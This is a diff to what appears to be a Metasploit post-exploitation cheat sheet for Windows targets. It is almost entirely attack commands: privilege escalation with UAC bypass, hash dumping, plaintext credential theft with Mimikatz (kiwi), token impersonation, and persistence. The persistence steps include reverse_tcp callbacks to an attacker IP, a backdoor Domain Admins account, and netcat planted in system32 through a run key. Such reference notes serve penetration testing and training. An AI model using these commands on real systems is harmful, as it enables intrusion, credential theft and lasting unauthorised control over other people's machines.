@@ -133,18 +133,25 @@ sessions -l                                   Show active sessions.
 sessions -i 2                                 Interact with session 2.
 ------------------------------------------------------------------------------------------------------
 
-# Post Exploitation with Meterpreter
+# Post exploitation - establish awareness
 
 migrate                                       Migrate the server to another process.
 sysinfo                                       Gets information about the remote system, such as OS.
 getuid                                        Get the user that the server is running as.
+ipconfig                                      Show the target IP.
+run post/windows/gather/checkvm               Check to see if the target is a VM.
+run get_local_subnets                         Get the local subnets.
+------------------------------------------------------------------------------------------------------
 
 # Escalate Privileges
 
-getsystem                                     Attempt to elevate your privilege to that of local system. If this fails containue.
-background                                    Backgrounds the current session.
+use priv                                      Attempt to elevate to NT AUTHORITY\SYSTEM.
+background                                    If this fails, background the current session and try options. 
 
 Option 1:
+getsystem
+
+Option 2:
 use exploit/windows/local/bypassuac_vbs
 set session <#>                               
 set PAYLOAD windows/meterpreter/reverse_tcp
@@ -152,10 +159,8 @@ set LHOST <attacker IP>
 set LPORT 4444                                This MUST be a different port from what was used in the original exploit.
 exploit
 
-Option 2:
+Option 3:
 use post/windows/escalate/getsystem
-
-migrate
 getuid
 getsystem
 getuid                                        Privileges should now be NT AUTHORITY\SYSTEM.
@@ -169,51 +174,57 @@ use exploit/windows/local/ms_ndproxy
 use exploit/windows/local/ask
 ------------------------------------------------------------------------------------------------------
 
-# Dump hashes & passwords
+# Dump hashes
 
 hashdump                                      Try to dump password hashes. If this fails continue.
 ps                                            Show running processes.
-migrate <pid>                                 Migrate to a specific process running as NT AUTHORITY\SYSTEM.
-hashdump
+migrate <pid>                                 Migrate to a process running as NT AUTHORITY\SYSTEM.
+hashdump                                      Dump password hashes.
+
 run post/windows/gather/credentials/credential_collector
+run post/windows/gather/credentials/domain_hashdump
+------------------------------------------------------------------------------------------------------
+
+# View passwords
 
 load kiwi                                     Mimikatz
 lsa_dump                                      Show the current user password in plain text.
 creds_all                                     Show all user passwords in plain text.
 wifi_list                                     Show all wireless networks that have been connected and passwords.
-
-# Domain Controller
-
-use/post/windows/gather/credentials/domain_hashdump
 ------------------------------------------------------------------------------------------------------
 
-# Persistance
+# Steal tokens to impersonate
 
-add_user <user> <password> -h <target IP>
-add_group_user "Domain Admins" <user> -h <target IP>
-------------------------------------------------
+use incognito
+list_tokens -u
+list_tokens -g
+impersonate_token <domain>\\<user>
+getuid
+------------------------------------------------------------------------------------------------------
 
+# Establish persistance
+
+Option 1:
 run persistence -h
-
 run persistence <starts at computer startup> <tries to connect every 30s> <port 443> <attacker IP>
-
 run persistence -X -i 30 -p 443 -r <target IP>
-
 Notice that it shows where the file is stored on the Windows machine.
 It also gives you the location of the Meterpreter resource file you can run to remove persistence.
 
-Example 2:
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <attacker IP>
-set LPORT 443
-set ExitOnSession false
-set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
-exploit -j -z
-------------------------------------------------
+Example:
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/meterpreter/reverse_tcp
+msf > set LHOST <attacker IP>
+msf > set LPORT 443
+msf > set ExitOnSession false
+msf > set AutoRunScript persistence -X -i 30 -p 443 -r <target IP>
+msf > exploit -j -z
 
-Scheduled persistence
+Option 2 - Add a user:
+add_user <user> <password> -h <target IP>
+add_group_user "Domain Admins" <user> -h <target IP>
 
+Option 3 - Scheduled:
 msf > info exploit/windows/local/s4u_persistence
 
 Notice the trigger methods: event, lock, logon, schedule, unlock
@@ -222,18 +233,15 @@ msf > use exploit/windows/local/s4u_persistence
 msf > set session 1
 msf > set TRIGGER lock
 msf > exploit
-------------------------------------------------
 
-Volume Shadow Copy persistence
-
+Option 4 - Volume Shadow Copy:
 msf > use exploit/windows/local/vss_persistence
 msf > set session 1
-msf > set RHOST 172.16.181.140
+msf > set RHOST <target IP>
 msf > set LPORT 4445  <———use a different port number
 msf > exploit
-------------------------------------------------
 
-Upload netcat.
+Option 5 - Upload netcat:
 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32\\
 
 Check for anything the runs at startup.
@@ -248,22 +256,14 @@ meterpreter > reg queryval -k HKLM\\software\\windows\\currentversion\\run -v ne
 Reboot the target system.
 meterpreter >  reboot
 
-Connect to target system - option 1
+Connect to target system - option 1:
 Open a new Terminal: nc -vn <target IP> 443
 
-Connect to target system - option 2
+Connect to target system - option 2:
 use multi/handler
 set PAYLOAD windows/shell_bind_tcp
 set RHOST <target IP>
 exploit
-------------------------------------------------------------------------------------------------------
-
-# Tokens
-
-use incognito
-list_tokens -u
-list_tokens -g
-impersonate_token <domain>\\<user>
 ------------------------------------------------------------------------------------------------------
 
 # Upload tools
